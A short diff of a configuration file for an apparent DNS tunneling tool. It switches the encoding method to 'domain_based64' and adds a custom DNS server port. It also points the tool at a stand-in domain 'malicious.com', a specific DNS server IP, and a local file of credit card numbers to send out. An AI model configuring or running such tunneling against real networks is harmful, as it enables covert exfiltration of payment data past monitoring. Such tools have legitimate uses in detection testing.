@@ -1,5 +1,6 @@
 seconds_between_query=.001
-method=domain_based
+method=domain_based64
 domain_name=malicious.com
 dns_server_ip=141.226.242.178
+dns_server_port=5053
 path_to_data_file=D:/Projects/Python/DnsTunnelingTool/credit Cards.txt
